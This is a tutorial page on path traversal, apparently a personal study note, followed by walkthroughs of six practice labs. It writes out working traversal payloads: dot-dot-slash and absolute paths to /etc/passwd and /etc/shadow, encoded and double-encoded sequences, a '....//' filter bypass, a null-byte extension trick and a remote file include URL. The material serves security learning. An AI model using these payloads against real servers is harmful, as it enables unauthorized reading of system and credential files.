<h1>Path Traversal</h1>

<p align="center">
<br/>
<img src="https://i.imgur.com/23gjYcI.png" height="300%" width="300%" alt="Prompt Injection"/>
<br />
<br />
</p>

<h2>Definition</h2>

A **path traversal attack (also known as directory traversal)** aims to access files and directories that are stored outside the web root folder. By manipulating variables that reference files with “dot-dot-slash (../)” sequences and its variations or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system including application source code or configuration and critical system files. It should be noted that access to files is limited by system operational access control (such as in the case of locked or in-use files on the Microsoft Windows operating system).

<h2>Explanation</h2>
Imagine a shopping application that displays images of items for sale. This might load an image using the following HTML:

<code class="code-scrollable">&lt;img src=&quot;/loadImage?filename=218.png&quot;&gt;</code>

The <code>loadImage</code> URL takes a <code>filename</code> parameter and returns the contents of the specified file. The image files are stored on disk in the location <code>/var/www/images/</code>. To return an image, the application appends the requested filename to this base directory and uses a filesystem API to read the contents of the file. In other words, the application reads from the following file path:

<code class="code-scrollable">/var/www/images/218.png</code><p>

This application implements no defenses against path traversal attacks. As a result, an attacker can request the following URL to retrieve the <code>/etc/passwd</code> file from the server's filesystem:

<code class="code-scrollable">https://insecure-website[.]com/loadImage?filename=../../../etc/passwd</code>

This causes the application to read from the following file path:

<code class="code-scrollable">/var/www/images/../../../etc/passwd</code>

The sequence <code>../</code> is valid within a file path, and means to step up one level in the directory structure. The three consecutive <code>../</code> sequences step up from <code>/var/www/images/</code> to the filesystem root, and so the file that is actually read is:

<code class="code-scrollable">/etc/passwd</code>
  
On Unix-based operating systems, this is a standard file containing details of the users that are registered on the server, but an attacker could retrieve other arbitrary files using the same technique.
On Windows, both <code>../</code> and <code>..\</code> are valid directory traversal sequences. The following is an example of an equivalent attack against a Windows-based server:

<code class="code-scrollable">https://insecure-website[.]com/loadImage?filename=..\..\..\windows\win.ini</code>

<h3 id="request-variations">Path Traversal Variations</h3>

<p>Encoding and double encoding:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">%2e%2e%2f</code> represents <code class="language-plaintext highlighter-rouge">../</code></li>
  <li><code class="language-plaintext highlighter-rouge">%2e%2e/</code> represents <code class="language-plaintext highlighter-rouge">../</code></li>
  <li><code class="language-plaintext highlighter-rouge">..%2f</code> represents <code class="language-plaintext highlighter-rouge">../ </code></li>
  <li><code class="language-plaintext highlighter-rouge">%2e%2e%5c</code> represents <code class="language-plaintext highlighter-rouge">..\</code></li>
  <li><code class="language-plaintext highlighter-rouge">%2e%2e\</code> represents <code class="language-plaintext highlighter-rouge">..\ </code></li>
  <li><code class="language-plaintext highlighter-rouge">..%5c</code> represents <code class="language-plaintext highlighter-rouge">..\ </code></li>
  <li><code class="language-plaintext highlighter-rouge">%252e%252e%255c</code> represents <code class="language-plaintext highlighter-rouge">..\ </code></li>
  <li><code class="language-plaintext highlighter-rouge">..%255c</code> represents <code class="language-plaintext highlighter-rouge">..\</code> </li>
</ul>

<p>and so on.</p>

<h4 id="percent-encoding-aka-url-encoding">Percent encoding (aka URL encoding)</h4>

<p>Note that web containers perform one level of decoding on percent
encoded values from forms and URLs.</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">..%c0%af</code> represents <code class="language-plaintext highlighter-rouge">../ </code></li>
  <li><code class="language-plaintext highlighter-rouge">..%c1%9c</code> represents <code class="language-plaintext highlighter-rouge">..\ </code></li>
</ul>

<h4 id="os-specific">OS specific</h4>

<p>UNIX</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Root directory:  “ / “ 
Directory separator: “ / “
</code></pre></div></div>

<p>WINDOWS</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Root directory: “  &lt;partition letter&gt; : \ “
Directory separator: “ / “ or “ \ ” 
Note that windows allows filenames to be followed by extra . \ / characters.
</code></pre></div></div>

<p>In many operating systems, null bytes <code class="language-plaintext highlighter-rouge">%00</code> can be injected to terminate the filename. For example, sending a parameter like:</p>

<p><code class="language-plaintext highlighter-rouge">?file=secret.doc%00.pdf</code></p>

<p>will result in the Java application seeing a string that ends with “.pdf” and the operating system will see a file that ends in “.doc”. Attackers may use this trick to bypass validation routines.</p>

<h2 id="examples">Examples</h2>

<h3 id="example-1">Example 1</h3>

<p>The following examples show how the application deals with the resources in use.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://some_site.com.br/get-files.jsp?file=report.pdf
http://some_site.com.br/get-page.php?home=aaa.html 
http://some_site.com.br/some-page.asp?page=index.html
</code></pre></div></div>

<p>In these examples it’s possible to insert a malicious string as the
variable parameter to access files located outside the web publish
directory.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://some_site.com.br/get-files?file=../../../../some dir/some file
http://some_site.com.br/../../../../some dir/some file
</code></pre></div></div>

<p>The following URLs show examples of *NIX password file exploitation.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://some_site.com.br/../../../../etc/shadow
http://some_site.com.br/get-files?file=/etc/passwd
</code></pre></div></div>

<p>Note: In a Windows system an attacker can navigate only in a partition
that locates web root while in the Linux they can navigate in the whole
disk.</p>

<h3 id="example-2">Example 2</h3>

<p>It’s also possible to include files and scripts located on external
website.</p>

<p><code class="language-plaintext highlighter-rouge">http://some_site.com.br/some-page?page=http://other-site.com.br/other-page.htm/malicius-code.php</code></p>

<h3 id="example-3">Example 3</h3>

<p>These examples illustrate a case when an attacker made the server show
the CGI source code.</p>

<p><code class="language-plaintext highlighter-rouge">http://vulnerable-page.org/cgi-bin/main.cgi?file=main.cgi</code></p>

<h3 id="example-4">Example 4</h3>

<p>This example was extracted from: <a href="https://en.wikipedia.org/wiki/Directory_traversal_attack#Example">Wikipedia - Directory Traversal</a></p>

<p>A typical example of vulnerable application code is:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php
$template = 'blue.php';
if ( is_set( $_COOKIE['TEMPLATE'] ) )
   $template = $_COOKIE['TEMPLATE'];
include ( "/home/users/phpguru/templates/" . $template );
?&gt;
</code></pre></div></div>

<p>An attack against this system could be to send the following HTTP
request:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /vulnerable.php HTTP/1.0
Cookie: TEMPLATE=../../../../../../../../../etc/passwd
</code></pre></div></div>

<p>Generating a server response such as:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.0 200 OK
Content-Type: text/html
Server: Apache

root:fi3sED95ibqR6:0:1:System Operator:/:/bin/ksh
daemon:*:1:1::/tmp:
phpguru:f8fk3j1OIf31.:182:100:Developer:/home/users/phpguru/:/bin/csh
</code></pre></div></div>

<p>The repeated <code class="language-plaintext highlighter-rouge">../</code> characters after <code class="language-plaintext highlighter-rouge">/home/users/phpguru/templates/</code> has
caused <a href="http://www.php.net/manual/en/function.include.php">include()</a> to
traverse to the root directory, and then include the UNIX password file
<code class="language-plaintext highlighter-rouge">/etc/passwd</code>.</p>

<p>UNIX <code class="language-plaintext highlighter-rouge">etc/passwd</code> is a common file used to demonstrate <strong>directory
traversal</strong>, as it is often used by crackers to try cracking the
passwords.</p>

<h3 id="absolute-path-traversal">Absolute Path Traversal</h3>

<p>The following URLs may be vulnerable to this attack:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://testsite.com/get.php?f=list
http://testsite.com/get.cgi?f=2
http://testsite.com/get.asp?f=test
</code></pre></div></div>

<p>An attacker can execute this attack like this:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://testsite.com/get.php?f=/var/www/html/get.php
http://testsite.com/get.cgi?f=/var/www/html/admin/get.inc
http://testsite.com/get.asp?f=/etc/passwd
</code></pre></div></div>

<p>When the web server returns information about errors in a web
application, it is much easier for the attacker to guess the correct
locations (e.g. path to the file with a source code, which then may be
displayed).</p>

<h1>Lab: File path traversal, simple case</h1>

**This lab contains a path traversal vulnerability in the display of product images. To solve the lab, retrieve the contents of the /etc/passwd file.**

<h2>The Vulnerable Website</h2>

![image](https://github.com/dante-falls/Web-Security/assets/29386604/18e7b0f9-8d89-4f64-8d7b-7aeec2bcc7bf)
![image](https://github.com/dante-falls/Web-Security/assets/29386604/db33816b-2cd4-4852-ae70-6523c9ac1513)

<h2>How Products Are Displayed</h2>

![image](https://github.com/dante-falls/Web-Security/assets/29386604/8b068b94-716c-4d2a-8bfa-8da4bf0d1300)
![image](https://github.com/dante-falls/Web-Security/assets/29386604/9cec0f7d-4f3f-411a-8beb-c9fa1a1aa726)

<h2>Products are displayed as image files. You can copy the image link and go to webpage that hosts the image</h2>

![image](https://github.com/dante-falls/Web-Security/assets/29386604/0a279ba0-a4fe-4025-8bd9-5820dd309b89)
![image](https://github.com/dante-falls/Web-Security/assets/29386604/310e4325-3b15-4bad-bfc7-102c0ecfcf9d)
![image](https://github.com/dante-falls/Web-Security/assets/29386604/8dfdb53e-2d66-49b3-b5a3-c883c7c194d9)

<h2>Using The Developer Options To Access A File By Traversing Directories</h2>

![image](https://github.com/dante-falls/Web-Security/assets/29386604/2c6f2a00-8c65-467c-a657-b9d3e6d73d25)
![image](https://github.com/dante-falls/Web-Security/assets/29386604/bfa3e9ce-9b07-4ee4-b007-10550144ba18)

<h2>Decoding The Contents Of The File From Base64 To Clear-text</h2>

![image](https://github.com/dante-falls/Web-Security/assets/29386604/81c944e6-472b-4e7d-acb1-dba964d3675c)
![image](https://github.com/dante-falls/Web-Security/assets/29386604/2ad26994-e9e6-42ea-8adc-79093418757d)

<h1>Lab 2: File path traversal, traversal sequences blocked with absolute path bypass</h1>

**This lab contains a path traversal vulnerability in the display of product images.The application blocks traversal sequences but treats the supplied filename as being relative to a default working directory. To solve the lab, retrieve the contents of the /etc/passwd file.**

<h2>The Vulnerable Website</h2>

![image](https://github.com/dante-falls/Web-Security/assets/29386604/51671e89-59ce-4aea-8eb5-9b2c4a5f9ad6)
![image](https://github.com/dante-falls/Web-Security/assets/29386604/166034f3-04e0-452c-b8eb-940a7a6abcca)

<h2>Products are displayed with image files so we will follow the image links</h2>

![image](https://github.com/dante-falls/Web-Security/assets/29386604/54553832-c9a2-4c3f-8405-14e860414d10)
![image](https://github.com/dante-falls/Web-Security/assets/29386604/1e9cb5ff-c486-450c-b997-5feb5d9b1b85)

<h2>This is the image File Location</h2>

![image](https://github.com/dante-falls/Web-Security/assets/29386604/e5d951d2-417e-4afb-aad4-4f6f8ff15a11)
![image](https://github.com/dante-falls/Web-Security/assets/29386604/faef163d-a600-409a-8dd4-9b897c5a60c6)

<h2>Let's try making a request for the /etc/passwd file using the absolute path without any traversal sequences</h2>

![image](https://github.com/dante-falls/Web-Security/assets/29386604/2869c2b7-5379-4fee-836d-1e11ec494412)
![image](https://github.com/dante-falls/Web-Security/assets/29386604/b207ba4e-95c8-4da8-ba2b-700fe16828b0)

<h2>Copying and Decoding the contents of the file from Base64 to clear-text</h2>

![image](https://github.com/dante-falls/Web-Security/assets/29386604/84da12ef-12db-4bd2-98b4-88b65e97f21d)
![image](https://github.com/dante-falls/Web-Security/assets/29386604/7f7af9c9-d4ef-40d2-be6c-a03c32e29c8b)

<h1>Lab 3: File path traversal, traversal sequences stripped non-recursively</h1>

**This lab contains a path traversal vulnerability in the display of product images. The application strips path traversal sequences from the user-supplied filename before using it. To solve the lab, retrieve the contents of the /etc/passwd file.** 

<h2>The Vulnerable Website</h2>

![image](https://github.com/dante-falls/Web-Security/assets/29386604/0d0a33b9-71ab-4c5f-9cfc-8b3ec2cfb469)
![image](https://github.com/dante-falls/Web-Security/assets/29386604/6fbdb149-d733-449e-9c3e-d2f62926ae5c)

<h2>Products are displayed with image files so we will follow the image links</h2>

![image](https://github.com/dante-falls/Web-Security/assets/29386604/a563a2a0-7557-4dc9-8fe7-e856109d7791)
![image](https://github.com/dante-falls/Web-Security/assets/29386604/96465530-434b-43e4-9c20-724b66d65b40)

<h2>This is the image File Location</h2>

![image](https://github.com/dante-falls/Web-Security/assets/29386604/31e231d4-7684-4f62-8d62-5bfbfdbce42f)
![image](https://github.com/dante-falls/Web-Security/assets/29386604/4118526b-59d5-4476-971b-c4041127609c)

<h2>Let's try making a request for the ../../../etc/passwd file by encoding the ../</h2>

**Take notice that a regular ../../../etc/passwd attempt failes because traversal sequences are in fact stripped. I tried a few methods of url encoding and double url encoding, none worked**

![image](https://github.com/dante-falls/Web-Security/assets/29386604/6e5d076d-126d-499d-8999-8008b7b05676)
![image](https://github.com/dante-falls/Web-Security/assets/29386604/ec2b82fd-180f-4f26-86c9-18a642341b28)

**I finally got a successful response for the /etc/passwd when I used "....//....//....//etc/passwd" in my GET Request to the web application.**

![image](https://github.com/dante-falls/Web-Security/assets/29386604/2ae65b33-6db3-46b0-8b6e-cf066fa0e78f)


<h2>Copying and Decoding the contents of the file from Base64 to clear-text</h2>

![image](https://github.com/dante-falls/Web-Security/assets/29386604/1fd03bbd-da68-4a13-8a5d-11e0748b4d95)
![image](https://github.com/dante-falls/Web-Security/assets/29386604/ffac51ce-4809-44a9-98b0-391ec4edacc7)

<h1>Lab 4: File path traversal, traversal sequences stripped with superfluous URL-decode</h1>

**This lab contains a path traversal vulnerability in the display of product images. The application blocks input containing path traversal sequences. It then performs a URL-decode of the input before using it. To solve the lab, retrieve the contents of the /etc/passwd file.** 

<h2>The Vulnerable Website</h2>

![image](https://github.com/dante-falls/Web-Security/assets/29386604/de2c49ea-a32a-4d06-a5ca-a80b91085f9e)
![image](https://github.com/dante-falls/Web-Security/assets/29386604/4f3a5708-a184-49f9-b145-03d8385ce4a8)


<h2>Products are displayed with image files so we will follow the image links</h2>

![image](https://github.com/dante-falls/Web-Security/assets/29386604/9fddcf3c-3ff7-4071-bb6d-bb55f13f7b5b)
![image](https://github.com/dante-falls/Web-Security/assets/29386604/19215a51-ca62-41bf-8c84-004d9b99a918)

<h2>This is the image File Location</h2>

![image](https://github.com/dante-falls/Web-Security/assets/29386604/f881e693-066a-499f-ba89-b3b2bf41c838)
![image](https://github.com/dante-falls/Web-Security/assets/29386604/ad418eda-45dc-41bd-8a45-7de2d03efee7)

<h2>Let's try making a request for the etc/passwd file by including the base directory and traversing towards the file/</h2>

**This attempt failed because traversal sequences are stripped from user input**

![image](https://github.com/dante-falls/Web-Security/assets/29386604/89c09bda-119b-4c4e-9a39-84733af3382b)

**This attempt failed because I used single url encoding for ../ and the superfluous url-decoding converted my input into ../../../etc/passwd**

![image](https://github.com/dante-falls/Web-Security/assets/29386604/07b91b8b-abb9-4431-acd8-bee7f55d4755)


**My Successful Attempt to retrieve /etc/passwd was with a double url encoding of %252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd**

![image](https://github.com/dante-falls/Web-Security/assets/29386604/2e14df46-a258-49f9-864e-f9c326df4ecd)

<h2>Copying and Decoding the contents of the file from Base64 to clear-text</h2>

![image](https://github.com/dante-falls/Web-Security/assets/29386604/9de1efc2-6d8f-4b11-a525-9b93ed9d05d3)
![image](https://github.com/dante-falls/Web-Security/assets/29386604/0e391f00-3562-4d6d-91e4-1190dcb5f53a)

<h1>Lab 5: File path traversal, validation of start of path</h1>

**This lab contains a path traversal vulnerability in the display of product images. The application transmits the full file path via a request parameter, and validates that the supplied path starts with the expected folder. To solve the lab, retrieve the contents of the /etc/passwd file.** 

<h2>The Vulnerable Website</h2>

![image](https://github.com/dante-falls/Web-Security/assets/29386604/2f07d925-82ed-46c3-9d46-3fe573709a04)
![image](https://github.com/dante-falls/Web-Security/assets/29386604/5dfb9184-959a-48d5-bdd8-c71d6fa91ef4)

<h2>Products are displayed with image files so we will follow the image links</h2>

![image](https://github.com/dante-falls/Web-Security/assets/29386604/595d6c66-2a41-49aa-9dbd-0232c531b6f8)
![image](https://github.com/dante-falls/Web-Security/assets/29386604/30bb87cc-a764-49be-8301-8fbb9f5dea25)

<h2>This is the image File Location</h2>

![image](https://github.com/dante-falls/Web-Security/assets/29386604/5d534e18-1d92-4fcd-a240-a32418e26349)
![image](https://github.com/dante-falls/Web-Security/assets/29386604/91bede1f-83c5-4f36-8623-ddf0cb2a4091)

<h2>Let's try making a request for the /etc/passwd file while including the base directory that holds images /var/www/images/../../../etc/passwd</h2>

**My Attempt was successful because the web application simply verifies that the base directory that holds images is present in the user input, but doesn't verify what file it displays**

![image](https://github.com/dante-falls/Web-Security/assets/29386604/bc4feb5d-575b-4977-8391-4d970bdf5c53)

<h2>Copying and Decoding the contents of the file from Base64 to clear-text</h2>

![image](https://github.com/dante-falls/Web-Security/assets/29386604/3cc68ac5-7370-4029-87c4-95eeb285329a)
![image](https://github.com/dante-falls/Web-Security/assets/29386604/18664bf2-19de-4c48-8b01-dace5dc05054)

<h1>Lab 6: File path traversal, validation of file extension with null byte bypass</h1>

**This lab contains a path traversal vulnerability in the display of product images. The application validates that the supplied filename ends with the expected file extension. To solve the lab, retrieve the contents of the /etc/passwd file.** 

<h2>The Vulnerable Website</h2>

![image](https://github.com/dante-falls/Web-Security/assets/29386604/e016bb8f-ddf0-4fe3-902c-c774b049de4d)
![image](https://github.com/dante-falls/Web-Security/assets/29386604/e3ddbb2d-1755-4b76-998f-64346854c7fa)

<h2>Products are displayed with image files so we will follow the image links</h2>

![image](https://github.com/dante-falls/Web-Security/assets/29386604/aa44f3c2-cd93-49cb-84f2-95fcfe66b042)
![image](https://github.com/dante-falls/Web-Security/assets/29386604/7b9d81a9-2eb0-452e-92f3-145a735cf964)

<h2>This is the image File Location</h2>

![image](https://github.com/dante-falls/Web-Security/assets/29386604/dfa07376-bd82-4de7-a292-bbd700a5a170)
![image](https://github.com/dante-falls/Web-Security/assets/29386604/f4d8a831-36aa-4c96-b2d9-c54b9998997c)

<h2>Let's try making a request for the /etc/passwd file but using NULL BYTE (%00) to make it look like we are requesting an image file</h2>

**My Attempt was successful because the web application simply verifies that file being requested is an image file, and we used %00 to represent an image file**

![image](https://github.com/dante-falls/Web-Security/assets/29386604/f1551e37-5653-4b65-b530-521df0ef9208)

<h2>Copying and Decoding the contents of the file from Base64 to clear-text</h2>

![image](https://github.com/dante-falls/Web-Security/assets/29386604/e9f76347-d530-4e78-97a0-4049ec08552f)
![image](https://github.com/dante-falls/Web-Security/assets/29386604/b01bea9d-47f1-428b-956f-5bace2f6b9ae)

<h1>Using Burp Suite For Lab 6 [File path traversal, validation of file extension with null byte bypass]</h1>

<h2>The Vulnerable Website</h2>

![image](https://github.com/dante-falls/Web-Security/assets/29386604/c77d7520-d796-4a2c-bf71-ca3ba4c8da96)

<h2>When you make a request for the image file, Burp Proxy will intercept the request and you can change the values and input the nullbyte value before the file extension</h2>

![image](https://github.com/dante-falls/Web-Security/assets/29386604/1e0c7f24-037b-4d04-a0ff-786c90d993b6)
![image](https://github.com/dante-falls/Web-Security/assets/29386604/9d4e2e0b-7bc4-4654-86fd-2427a4e6384a)

<h2>You can see that the request was successful and the browser is trying to render the /etc/passwd file as an image</h2>

![image](https://github.com/dante-falls/Web-Security/assets/29386604/a606c010-cdcc-4afa-b3c7-57c44c8fe994)

<h2>Burp Suite will render the /etc/passwd file and you can now view the sensitive information within</h2>

![image](https://github.com/dante-falls/Web-Security/assets/29386604/1fd2cf47-bce7-4d36-b32d-ac5eaf6e8177)
